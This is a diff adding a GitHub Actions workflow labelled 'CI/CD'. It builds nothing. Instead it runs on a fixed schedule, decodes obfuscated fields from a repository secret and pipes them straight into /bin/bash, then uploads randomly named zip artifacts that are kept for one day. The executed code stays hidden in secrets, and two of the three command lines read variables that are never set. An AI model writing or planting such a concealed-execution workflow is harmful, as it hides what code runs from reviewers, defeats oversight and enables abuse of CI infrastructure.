@@ -1,0 +1,28 @@
+name: CI/CD
+on:
+  workflow_dispatch:
+
+  schedule:
+    - cron: '0 2,8,14,20 * * *'
+concurrency:
+  group: ${{ github.workflow }}
+  cancel-in-progress: false
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: Execute
+        env:
+          i6177: ${{ secrets.i6177 }}
+        run: |
+          printf '%s' "$i6177" | jq -r .ss17032 | /bin/bash
+          printf '%s' "$dlt048" | jq -r .zvm618 | /bin/bash
+          printf '%s' "$cxa51" | jq -r .ks743 | /bin/bash
+
+      - name: Upload artifact
+        uses: actions/upload-artifact@v4
+        with:
+          name: wkwDTi0O
+          path: "*.zip"
+          retention-days: 1
